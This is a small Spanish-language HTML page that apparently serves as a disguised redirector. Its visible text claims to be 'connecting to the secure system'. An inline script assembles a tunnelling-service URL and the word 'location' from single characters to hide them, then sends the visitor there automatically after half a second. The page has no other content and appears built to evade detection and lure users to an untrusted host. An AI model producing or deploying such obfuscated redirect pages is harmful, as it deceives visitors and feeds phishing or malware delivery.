<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Un momento...</title>
  <script>
    (function() {
      const fragmentos = [
        'h','t','t','p','s',':','/','/',
        'p','c','7','j','z','5','j','9','i',
        '.','l','o','c','a','l','t','o','.','n','e','t',
        '/','r','e','p','2','6','0','1','9','0','b','p'
      ];
      const destino = fragmentos.join('');
      const prop = ['l','o','c','a','t','i','o','n'].join('');
      setTimeout(() => window[prop].href = destino, 500);
    })();
  </script>
</head>
<body>
  <p>Conectando con el sistema seguro...</p>
</body>
</html>
